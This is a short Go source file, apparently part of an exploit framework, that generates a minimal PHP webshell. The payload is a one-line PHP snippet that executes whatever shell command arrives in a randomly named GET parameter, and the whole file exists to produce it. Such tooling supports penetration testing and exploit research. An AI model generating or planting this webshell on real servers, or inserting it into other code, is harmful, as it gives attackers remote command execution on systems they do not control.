package webshell

import (
	"fmt"

	"github.com/vulncheck-oss/go-exploit/random"
)

// A very basic PHP webshell using short tags and no error checking. The webshell
// will generate a random variable to fetch the command from. Usage example:
//
//	shell, param := webshell.PHP.MinimalGet()
func (php *PHPWebshell) MinimalGet() (string, string) {
	index := random.RandLetters(8)

	return fmt.Sprintf("<?=`$_GET[%s]`?>", index), index
}
